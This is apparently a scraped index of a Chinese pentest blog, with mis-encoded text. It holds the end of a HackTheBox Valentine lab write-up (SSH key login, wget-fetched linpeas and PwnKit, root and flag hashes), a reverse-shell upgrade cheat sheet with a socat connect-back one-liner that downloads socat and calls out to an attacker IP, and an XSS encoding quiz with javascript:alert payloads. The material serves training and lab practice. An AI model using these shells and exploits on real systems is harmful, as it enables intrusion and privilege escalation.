hype_key.rsa â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ ssh -i hype_key.rsa hype@10.10.10.79 Enter passphrase for key 'hype_key.rsa': è¿™é‡Œç§é’¥æœ‰å¯†ç ï¼Œæƒ³åˆ°äº†ä¹‹å‰decodeä¸­è·å–çš„å­—ç¬¦ä¸²ï¼šheartbleedbelievethehype â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ ssh -i hype_key.rsa hype@10.10.10.79 Enter passphrase for key 'hype_key.rsa': sign_and_send_pubkey: no mutual signature supported hype@10.10.10.79's password: è¿™é‡Œæœ‰ä¸ªæŠ¥é”™ï¼Œå› ä¸ºæ–°ç‰ˆæœ¬çš„sshä¸å†æ”¯æŒä¸€äº›å¼±åŠ å¯†ç®—æ³•ï¼Œæ‰€ä»¥å¦‚æœè¦ç”¨çš„è¯éœ€è¦æ‰‹åŠ¨æŒ‡å®š-o PubkeyAcceptedKeyTypes=+ssh-rsaã€‚ â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/012-Valentine] â””â”€$ ssh -i hype_key.rsa hype@10.10.10.79 -o PubkeyAcceptedKeyTypes=+ssh-rsa Enter passphrase for key 'hype_key.rsa': Welcome to Ubuntu 12.04 LTS (GNU/Linux 3.2.0-23-generic x86_64) * Documentation: https://help.ubuntu.com/ New release '14.04.5 LTS' available. Run 'do-release-upgrade' to upgrade to it. Last login: Fri Feb 16 14:50:29 2018 from 10.10.14.3 hype@Valentine:~$ id uid=1000(hype) gid=1000(hype) groups=1000(hype),24(cdrom),30(dip),46(plugdev),124(sambashare) hype@Valentine:~$ è¿™é‡Œä¹Ÿå¯ä»¥ä¿®æ”¹SSHé…ç½®æ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶æœ«å°¾è¿½åŠ ä»¥ä¸‹å†…å®¹ Host * PubkeyAcceptedKeyTypes=+ssh-rsa HostKeyAlgorithms=+ssh-rsa ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:5:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"root shell ä¸Šä¼ linpeas.shè¿›è¡Œä¿¡æ¯æœé›†ï¼Œåˆ©ç”¨Pythonå’Œwgetè¿›è¡Œä¸Šä¼  # kali â”Œâ”€â”€(xavierã‰¿kali)-[~/Desktop/HTB/tools] â””â”€$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... 10.10.10.79 - - [29/Apr/2023 17:10:53] \"GET /linpeas.sh HTTP/1.1\" 200 - # Victim hype@Valentine:/tmp$ wget http://10.10.14.22/linpeas.sh hype@Valentine:/tmp$ chmod +x linpeas.sh hype@Valentine:/tmp$ ./linpeas.sh \u003e result.txt åˆ©ç”¨åŒæ ·çš„æ–¹å¼ï¼Œå†æŠŠresult.txtä¸‹è½½åˆ°æœ¬åœ° ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:6:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"CVE-2021-4034 æŸ¥çœ‹result.txtï¼Œå‘ç°ç³»ç»Ÿå­˜åœ¨sudo CVE-2021-4034æ¼æ´ï¼Œå¯åˆ©ç”¨è¯¥æ¼æ´ææƒã€‚ hype@Valentine:/tmp$ wget http://10.10.14.22/PwnKit hype@Valentine:/tmp$ chmod +x PwnKit hype@Valentine:/tmp$ ./PwnKit root@Valentine:/tmp# id uid=0(root) gid=0(root) groups=0(root),24(cdrom),30(dip),46(plugdev),124(sambashare),1000(hype) root@Valentine:/tmp# root@Valentine:/tmp# cat /root/root.txt adf6f323296f600cec9294d64c6c9bc1 root@Valentine:/tmp# cat /home/hype/user.txt 0b946d1f7c12bb371585d67c10557dc8 ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:6:1","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"tmuxææƒ æŸ¥çœ‹result.txtï¼Œå‘ç°tmux session é€šè¿‡tmuxè¿›è¡Œææƒï¼ŒæˆåŠŸè·å–rootæƒé™ï¼š hype@Valentine:/tmp$ tmux -S /.devs/dev_sess root@Valentine:/tmp# id uid=0(root) gid=0(root) groups=0(root) root@Valentine:/tmp# ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:6:2","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["é¶åœº"],"content":"END ","date":"2023-05-01","objectID":"/posts/hackthebox-valentine/:7:0","tags":["HTB","OSCP"],"title":"HTBé¶æœº 012 Valentine WriteUp","uri":"/posts/hackthebox-valentine/"},{"categories":["Pentest"],"content":"ncå¾—åˆ°çš„åå¼¹shellæ˜¯ä¸€ä¸ªåŠŸèƒ½éå¸¸æœ‰é™çš„ shellï¼Œæœ¬æ–‡è®°å½•ä»åå¼¹shellåˆ°TTY Shellçš„ä¸€äº›æ–¹æ³•","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"Shell-Spawningï¼ˆåå¼¹shellåˆ°TTYShellï¼‰ å½“æˆ‘ä»¬åœ¨ linux æœºå™¨ä¸Šè·å¾—äº†ä¸€ä¸ª shellï¼Œè¿™ä¸ª shell å¯èƒ½æ²¡æœ‰ TTYï¼ˆç»ˆç«¯è¿æ¥ï¼‰åŠŸèƒ½ï¼Œå¯¼è‡´æ— æ³•æ‰§è¡Œä¸€äº›å‘½ä»¤ï¼Œä¾‹å¦‚åˆ‡æ¢ç”¨æˆ·çš„â€œsuâ€å‘½ä»¤æˆ–â€œnanoâ€æ–‡ä»¶åˆ›å»ºå’Œä¿®æ”¹å·¥å…·ã€‚ åŒæ ·ï¼Œæ¸—é€æµ‹è¯•ä¸­ä¹Ÿæœ‰å¾ˆå¤šé‡è¦åŠŸèƒ½æ— æ³•åœ¨æ²¡æœ‰TTYåŠŸèƒ½çš„shell ä¸Šè¿è¡Œã€‚ä¸ºäº†ç»§ç»­è¿›è¡Œæ¸—é€æµ‹è¯•ï¼Œä½ å°†éœ€è¦ç”Ÿæˆ TTY shellã€‚ é€šå¸¸ï¼Œåœ¨é€šè¿‡ nc æ•è· shell ä¹‹åï¼Œä¼šåœ¨ä¸€ä¸ªåŠŸèƒ½éå¸¸æœ‰é™çš„ shell ä¸­ã€‚ä¾‹å¦‚æ²¡æœ‰å‘½ä»¤å†å²è®°å½•ï¼ˆå¹¶ä½¿ç”¨å‘ä¸Šâ€œâ€å’Œâ€œå‘ä¸‹â€ç®­å¤´å¾ªç¯æµè§ˆå®ƒä»¬ï¼‰å’Œæ–‡ä»¶åç§°ã€å‘½ä»¤è¡¥å…¨ç­‰ã€‚åœ¨ç¼ºå°‘è¿™äº›åŠŸèƒ½çš„ shell ä¸­æŸ¥è¯¢æˆ–æ“ä½œä¼šæ¯”è¾ƒéº»çƒ¦ã€‚ æ³¨æ„ï¼šè¦æ£€æŸ¥ shell æ˜¯å¦æ˜¯ TTY shellï¼Œè¯·ä½¿ç”¨ tty å‘½ä»¤ã€‚ ä»¥ä¸‹ä¸ºéTTY shellä¸­ç”ŸæˆTTY shellçš„å®ç”¨å‘½ä»¤ã€‚ ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:1:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"1ã€Basic commands ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:2:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"åŸºäºPython: python -c 'import pty; pty.spawn(\"/bin/sh\")' python3 -c 'import pty; pty.spawn(\"/bin/sh\")' é¦–å…ˆè¿æ¥åˆ° shell åï¼Œå…ˆæ£€æŸ¥ä¸€ä¸‹ python çš„å¯ç”¨æ€§ï¼Œ ç”¨ winch å‘½ä»¤æ£€æŸ¥ï¼š which python python2 python3 åªè¦å®‰è£…äº†å…¶ä¸­ä»»ä½•ä¸€ä¸ªï¼Œå°±å°†è¿”å›å·²å®‰è£…äºŒè¿›åˆ¶æ–‡ä»¶çš„è·¯å¾„ã€‚ åœ¨é¶æœºä¸Šè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼ˆä½¿ç”¨æœºå™¨ä¸Šå¯ç”¨çš„ python ç‰ˆæœ¬ï¼ï¼‰ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'; æ¥ä¸‹æ¥ï¼Œåœ¨é¶æœºä¸Šè¾“å…¥ä»¥ä¸‹å‘½ä»¤æ¥è®¾ç½®ä¸€äº›é‡è¦çš„ç¯å¢ƒå˜é‡ï¼š export SHELL=bash export TERM=\"xterm-256color\" #å…è®¸ clearï¼Œå¹¶ä¸”æœ‰é¢œè‰² export TERM=\"screen-256color\" # TERMä»»é€‰å…¶ä¸€ é”®å…¥ ctrl-z ä»¥å°† shell å‘é€åˆ°åå°ã€‚ è®¾ç½® shell ä»¥é€šè¿‡åå‘ shell å‘é€æ§åˆ¶å­—ç¬¦å’Œå…¶ä»–åŸå§‹è¾“å…¥ã€‚ä½¿ç”¨ä»¥ä¸‹sttyå‘½ä»¤æ¥æ‰§è¡Œæ­¤æ“ä½œã€‚ stty raw -echo;fg å›è½¦ä¸€æ¬¡å è¾“å…¥ reset å†å›è½¦ å°†å†æ¬¡è¿›å…¥ shell ä¸­ã€‚ åˆ°æ­¤ TTY shell å‡çº§å®Œæˆã€‚ ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:2:1","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"å…¶ä»–å‘½ä»¤ï¼š echo os.system('/bin/bash') /bin/sh -i #python3 python3 -c 'import pty; pty.spawn(\"/bin/sh\")' #perl exec \"/bin/sh\"; perl -e 'exec \"/bin/sh\";' #ruby exec \"/bin/sh\" ruby -e 'exec \"/bin/sh\"' #lua lua -e \"os.execute('/bin/sh')\" ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:2:2","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"2ã€nmap nmapç‰ˆæœ¬ \u003c=5.21. nmap --interactive !sh è¿™å¯ä»¥å®ç°ä¸€ä¸ªTTYäº¤äº’shellï¼Œå¦‚æœnmapè¿˜å…·å¤‡SUIDæƒé™ï¼Œé‚£ä¹ˆè¿˜å¯ä»¥å®ç°æƒé™æå‡çš„æ•ˆæœã€‚ ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:3:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"3ã€vi/vim vi/vim æ˜¯ä¸€ä¸ªå¯ä»¥åœ¨éTTY shellä¸­è¿è¡Œçš„æ–‡æœ¬ç¼–è¾‘å™¨ã€‚ :!bash æˆ– :set shell=/bin/bash :shell ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:4:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"4ã€STTY â€œsttyâ€å‘½ä»¤å…è®¸æ‚¨æ›´æ”¹ç»ˆç«¯ä¸ç³»ç»Ÿçš„è¿æ¥ç‰¹æ€§ã€‚ ä¾‹å¦‚ï¼Œä½¿ç”¨ -a é€‰é¡¹è·å–å½“å‰é…ç½®ï¼š stty -a ä½¿ç”¨â€œsttyâ€ç”Ÿæˆshellï¼Œæ­¥éª¤å¦‚ä¸‹ï¼š In victim machine reverse shell $ python -c 'import pty; pty.spawn(\"/bin/bash\")' Ctrl-Z In Attacker console # echo $TERM # stty -a # stty raw -echo # fg [enter] [enter] In reverse shell $ reset $ export SHELL=bash $ export TERM=xterm-256color $ stty rows \u003cnum\u003e columns \u003ccols\u003e ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:5:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"5ã€IRB (From within IRB) - exec \"/bin/sh\" ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:6:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"5ã€rlwrap å¯ä»¥é€šè¿‡ä½¿ç”¨ rlwrap å‘½ä»¤åŒ…è£… nc ä¾¦å¬å™¨æ¥å‡è½»å¯¹ shell çš„ä¸€äº›é™åˆ¶ã€‚é»˜è®¤æƒ…å†µä¸‹ä¸ä¼šå®‰è£…å®ƒï¼Œéœ€è¦ä½¿ç”¨ sudo apt rlwrap æˆ– apt-get install rlwrap å®‰è£…ã€‚ $ rlwrap nc -lvnp $port ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:7:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"6ã€socat å¦ä¸€ç§æ–¹æ³•æ˜¯å°† socat äºŒè¿›åˆ¶æ–‡ä»¶ä¸Šä¼ åˆ°é¶æœºå¹¶è·å¾—ä¸€ä¸ªå®Œå…¨äº¤äº’å¼çš„ shellã€‚ä» https://github.com/andrew-d/static-binaries ä¸‹è½½é€‚å½“çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚Socat éœ€è¦åœ¨ä¸¤å°æœºå™¨ä¸Šæ‰èƒ½å·¥ä½œã€‚ #åœ¨æœ¬åœ°ç›‘å¬ï¼š: socat file:`tty`,raw,echo=0 tcp-listen:4444 #é¶æœº: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234 å¦‚æœåœ¨å‘½ä»¤æ³¨å…¥çš„åœ°æ–¹æ³¨å…¥åå¼¹ shellï¼Œè·å¾—å³æ—¶å®Œå…¨äº¤äº’å¼çš„åå‘ shellï¼š wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /dev/shm/socat; chmod +x /dev/shm/socat; /dev/shm/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.11.100:1234 å¦‚æœé¶æœºè®¿é—®ä¸äº†äº’è”ç½‘ï¼Œå°±å…ˆæŠŠ socat æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ï¼Œå¼€å¯ http æœåŠ¡ï¼Œç„¶åå°†ä¸Šé¢çš„è·¯å¾„æŒ‡å‘ä½ çš„æœ¬åœ°åœ°å€ã€‚ ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:8:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"å‚è€ƒæ–‡ç«  https://www.cnblogs.com/sainet/p/15783539.html https://rcenetsec.com/shell-spawning/ ","date":"2023-04-25","objectID":"/posts/20230425-shellspawn/:9:0","tags":["Pentest","RedTeam"],"title":"Shell Spawning","uri":"/posts/20230425-shellspawn/"},{"categories":["Pentest"],"content":"ä¸€ã€å°æµ‹éªŒ æœ¬æ–‡ä»‹ç»æµè§ˆå™¨åŠ è½½è¿‡ç¨‹ä»¥åŠå¸¸ç”¨çš„XSSç¼–ç è§£æåŸç†ã€‚é¦–å‘äºT00lsè®ºå›ï¼Œåœ¨åšå®¢ä¸­å†å‘ä¸€éç•™æ¡£ã€‚ é¦–å…ˆåšä¸ªå°æµ‹è¯•ï¼Œä¸‹é¢çš„XSS payloadèƒ½å¦è§¦å‘ï¼Œé¢˜ç›®é€‰è‡ªå¤§ä½¬åšå®¢ã€‚ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:1:0","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"é—®é¢˜ åŸºç¡€é¢˜ï¼š 1.URLç¼–ç \"javascript:alert(1)\" \u003ca href=\"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29\"\u003e\u003c/a\u003e 2.å®ä½“ç¼–ç \"javascript\"ï¼ŒURLç¼–ç \"alert(2)\" \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x73;\u0026#x63;\u0026#x72;\u0026#x69;\u0026#x70;\u0026#x74;:%61 %6c%65%72%74%28%32%29\"\u003e 3.URLç¼–ç \":\" \u003ca href=\"javascript%3aalert(3)\"\u003e\u003c/a\u003e 4.å®ä½“ç¼–ç \u003c \u003e \u003cdiv\u003e\u0026#60;img src=x onerror=alert(4)\u0026#62;\u003c/div\u003e 5.å®ä½“ç¼–ç \u003c \u003e \u003ctextarea\u003e\u0026#60;script\u0026#62;alert(5)\u0026#60;/script\u0026#62;\u003c/textarea\u003e 6. \u003ctextarea\u003e\u003cscript\u003ealert(6)\u003c/script\u003e\u003c/textarea\u003e é«˜çº§é¢˜ï¼š 7.å®ä½“ç¼–ç ' \u003cbutton onclick=\"confirm('7\u0026#39;);\"\u003eButton\u003c/button\u003e 8.Unicodeç¼–ç ' \u003cbutton onclick=\"confirm('8\\u0027);\"\u003eButton\u003c/button\u003e 9.å®ä½“ç¼–ç alert(9); \u003cscript\u003e\u0026#97;\u0026#108;\u0026#101;\u0026#114;\u0026#116\u0026#40;\u0026#57;\u0026#41;\u0026#59\u003c/script\u003e 10.Unicodeç¼–ç alert \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(10);\u003c/script\u003e 11.unicodeç¼–ç alert(11) \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074\\u0028\\u0031\\u0031\\u0029\u003c/script\u003e 12.Unicodeç¼–ç alertå’Œ12 \u003cscript\u003e\\u0061\\u006c\\u0065\\u0072\\u0074(\\u0031\\u0032)\u003c/script\u003e 13.Unicodeç¼–ç ' \u003cscript\u003ealert('13\\u0027)\u003c/script\u003e 14.Unicodeç¼–ç æ¢è¡Œç¬¦ \u003cscript\u003ealert('14\\u000a')\u003c/script\u003e é™„åŠ é¢˜ï¼š \u003ca href=\"\u0026#x6a;\u0026#x61;\u0026#x76;\u0026#x61;\u0026#x73;\u0026#x63;\u0026#x72;\u0026#x69;\u0026#x70;\u0026#x74;\u0026#x3a;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x36;\u0026#x25;\u0026#x33;\u0026#x31;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x36;\u0026#x25;\u0026#x36;\u0026#x33;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x36;\u0026#x25;\u0026#x33;\u0026#x35;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x37;\u0026#x25;\u0026#x33;\u0026#x32;\u0026#x25;\u0026#x35;\u0026#x63;\u0026#x25;\u0026#x37;\u0026#x35;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x30;\u0026#x25;\u0026#x33;\u0026#x37;\u0026#x25;\u0026#x33;\u0026#x34;\u0026#x28;\u0026#x31;\u0026#x35;\u0026#x29;\"\u003e\u003c/a\u003e ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:1:1","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"ç­”æ¡ˆ The answers to these questions are here and the testing page is here. å…·ä½“å†…å®¹å¯ä»¥å»å¤§ä½¬åšå®¢çœ‹ï¼Œæˆ‘è¿™å°±å†™ä¸ªç»“æœï¼ŒYè¡¨ç¤ºè§¦å‘ï¼ŒNè¡¨ç¤ºä¸è§¦å‘ 1Nï¼Œ2Yï¼Œ3Nï¼Œ4Nï¼Œ5Nï¼Œ6N 7Yï¼Œ8Nï¼Œ9Nï¼Œ10Yï¼Œ11Nï¼Œ12Nï¼Œ13Nï¼Œ14Y 15Y å¦‚æœå¤§éƒ¨åˆ†é—®é¢˜éƒ½å›ç­”æ­£ç¡®ï¼Œä¸”åœ¨è¿™è¿‡ç¨‹ä¸­æ²¡æœ‰æ„Ÿåˆ°å›°æƒ‘ï¼Œé‚£ä¹ˆå°±ä¸éœ€è¦å†é˜…è¯»è¿™ç¯‡æ–‡ç« äº†ã€‚ æœ¬æ–‡å°†è®²è§£æµè§ˆå™¨å·¥ä½œçš„ä¸€äº›åŸç†å’Œè§£æè¿‡ç¨‹ï¼Œå¸Œæœ›èƒ½æœ‰äº›å¸®åŠ©ã€‚ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:1:2","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"äºŒã€æµè§ˆå™¨å·¥ä½œåŸç† æµè§ˆå™¨çš„ä¸»è¦ç»„ä»¶ï¼ŒåŒ…å«ç”¨æˆ·ç•Œé¢ã€æµè§ˆå™¨å¼•æ“ã€å‘ˆç°å¼•æ“ã€ç½‘ç»œã€ç”¨æˆ·ç•Œé¢åç«¯ã€JavaScriptè§£é‡Šå™¨ã€æ•°æ®å­˜å‚¨ã€‚ ç”¨æˆ·ç•Œé¢ï¼š åŒ…æ‹¬åœ°å€æ ã€å‰è¿›/åé€€æŒ‰é’®ã€ä¹¦ç­¾èœå•ç­‰ã€‚é™¤äº†æµè§ˆå™¨ä¸»çª—å£æ˜¾ç¤ºçš„æ‚¨è¯·æ±‚çš„é¡µé¢å¤–ï¼Œå…¶ä»–æ˜¾ç¤ºçš„å„ä¸ªéƒ¨åˆ†éƒ½å±äºç”¨æˆ·ç•Œé¢ã€‚ æµè§ˆå™¨å¼•æ“ï¼šåœ¨ç”¨æˆ·ç•Œé¢å’Œå‘ˆç°å¼•æ“ä¹‹é—´ä¼ é€æŒ‡ä»¤ã€‚ å‘ˆç°å¼•æ“ï¼šè´Ÿè´£æ˜¾ç¤ºè¯·æ±‚çš„å†…å®¹ã€‚å¦‚æœè¯·æ±‚çš„å†…å®¹æ˜¯ HTMLï¼Œå®ƒå°±è´Ÿè´£è§£æ HTML å’Œ CSS å†…å®¹ï¼Œå¹¶å°†è§£æåçš„å†…å®¹æ˜¾ç¤ºåœ¨å±å¹•ä¸Šã€‚ ç½‘ç»œï¼šç”¨äºç½‘ç»œè°ƒç”¨ï¼Œæ¯”å¦‚ HTTP è¯·æ±‚ã€‚å…¶æ¥å£ä¸å¹³å°æ— å…³ï¼Œå¹¶ä¸ºæ‰€æœ‰å¹³å°æä¾›åº•å±‚å®ç°ã€‚ ç”¨æˆ·ç•Œé¢åç«¯ï¼šç”¨äºç»˜åˆ¶åŸºæœ¬çš„çª—å£å°éƒ¨ä»¶ï¼Œæ¯”å¦‚ç»„åˆæ¡†å’Œçª—å£ã€‚å…¶å…¬å¼€äº†ä¸å¹³å°æ— å…³çš„é€šç”¨æ¥å£ï¼Œè€Œåœ¨åº•å±‚ä½¿ç”¨æ“ä½œç³»ç»Ÿçš„ç”¨æˆ·ç•Œé¢æ–¹æ³•ã€‚ JavaScript è§£é‡Šå™¨ï¼šç”¨äºè§£æå’Œæ‰§è¡Œ JavaScript ä»£ç ã€‚ æ•°æ®å­˜å‚¨ï¼šè¿™æ˜¯æŒä¹…å±‚ã€‚æµè§ˆå™¨éœ€è¦åœ¨ç¡¬ç›˜ä¸Šä¿å­˜å„ç§æ•°æ®ï¼Œä¾‹å¦‚ Cookieã€‚æ–°çš„ HTML è§„èŒƒ (HTML5) å®šä¹‰äº†â€œç½‘ç»œæ•°æ®åº“â€ï¼Œè¿™æ˜¯ä¸€ä¸ªå®Œæ•´ï¼ˆä½†æ˜¯è½»ä¾¿ï¼‰çš„æµè§ˆå™¨å†…æ•°æ®åº“ã€‚ ","date":"2023-03-30","objectID":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/:2:0","tags":["Pentest","XSS"],"title":"æµè§ˆå™¨XSSç¼–ç è§£æåŸç†","uri":"/posts/2023-6-%E6%B5%8F%E8%A7%88%E5%99%A8xss%E7%BC%96%E7%A0%81%E8%A7%A3%E6%9E%90%E5%8E%9F%E7%90%86/"},{"categories":["Pentest"],"content":"ä¸‰ã€ç½‘é¡µåŠ è½½è¿‡ç¨‹ æµè§ˆå™¨åŠ è½½è§£ææ¸²æŸ“å‘ˆç°çš„æ•´ä¸ªè¿‡ç¨‹ç§°ä¸ºå…³é”®æ¸²æŸ“è·¯å¾„ï¼ˆCritical Rendering Pathï¼‰ï¼ŒæŒ‡çš„æ˜¯æµè§ˆå™¨ä»è¯·æ±‚ HTMLï¼ŒCSSï¼ŒJavaScript æ–‡ä»¶å¼€å§‹ï¼Œåˆ°å°†å®ƒä»¬æœ€ç»ˆä»¥åƒç´ è¾“å‡ºåˆ°å±å¹•ä¸Šè¿™ä¸€è¿‡ç¨‹ã€‚åŒ…æ‹¬ä»¥ä¸‹å‡ ä¸ªéƒ¨åˆ†ï¼š æ„å»ºDOMæ ‘ï¼Œæ„å»ºCSSOMï¼Œæ„å»ºRenderï¼ŒLayoutå’ŒPaintï¼Œè¿™äº›è¿‡ç¨‹ä¸­å­˜åœ¨è¿™ä¸€å®šçš„äº¤å‰ã€‚ ä¸‹é¢ç®€è¿°æµè§ˆå™¨åŠ è½½è§£ææ¸²æŸ“çš„æ•´ä¸ªè¿‡ç¨‹ï¼š 1ã€æµè§ˆå™¨é€šè¿‡URLè¿›è¡ŒåŸŸåè§£æï¼Œå‘æœåŠ¡å™¨å‘èµ·è¯·æ±‚ï¼Œæ¥å—æ–‡ä»¶ 2ã€æ„å»ºDOMæ ‘ï¼šæµè§ˆå™¨è·å–ä¸€ä¸ªHTMLé¡µé¢æ—¶ï¼Œä¼šè‡ªä¸Šè€Œä¸‹åŠ è½½ï¼Œå¹¶é€è¡Œè§£æHTMLæ ‡ç­¾ï¼Œè§£æå™¨æ ¹æ®HTMLæ–‡æ¡£å¼€å§‹æ„å»ºDOMæ ‘ã€‚ **HTMLæ–‡æ¡£è§£æè¿‡ç¨‹**ï¼š 1ï¼‰æµè§ˆå™¨æ¥æ”¶åˆ°æ˜¾ç¤ºå­—èŠ‚å†…å®¹çš„htmlæ–‡ä»¶ï¼› 2ï¼‰æµè§ˆå™¨å°†å­—èŠ‚å†…å®¹è½¬æ¢ä¸ºå­—ç¬¦æ–‡ä»¶ï¼› 3ï¼‰æµè§ˆå™¨å°†å­—ç¬¦æ–‡ä»¶è§£ææˆè®¸å¤šTokensï¼ˆç¬¦å·æ ‡ç­¾ï¼‰ï¼› 4ï¼‰å°†Tokenè§£æä¸ºèŠ‚ç‚¹å¯¹è±¡Objectsï¼› 5ï¼‰å°†èŠ‚ç‚¹å¯¹è±¡Objectsè¿æ¥èµ·æ¥å½¢æˆDOMæ ‘ï¼› 3ã€æ„å»ºCSSOMæ ‘ï¼šæµè§ˆå™¨åœ¨HTMLæ–‡æ¡£è§£æè¿‡ç¨‹ä¸­ï¼Œé‡åˆ°å¤–éƒ¨CSSæ–‡ä»¶ï¼Œæµè§ˆå™¨ä¼šå¦å¤–å‘èµ·è¯·æ±‚å»è·å–CSSæ–‡ä»¶å¹¶è¿›è¡Œè§£ææ„å»ºCSSOMæ ‘ï¼Œå¹¶ä¸ä¼šé˜»å¡ç½‘é¡µåŠ è½½è¿‡ç¨‹ï¼Œä¸å½±å“è§£æHTMLæ–‡ä»¶ã€‚ **è§£æCSSè¿‡ç¨‹**ï¼š æ­¥éª¤ä¸HTMLæ–‡æ¡£è§£æç±»ä¼¼ï¼š 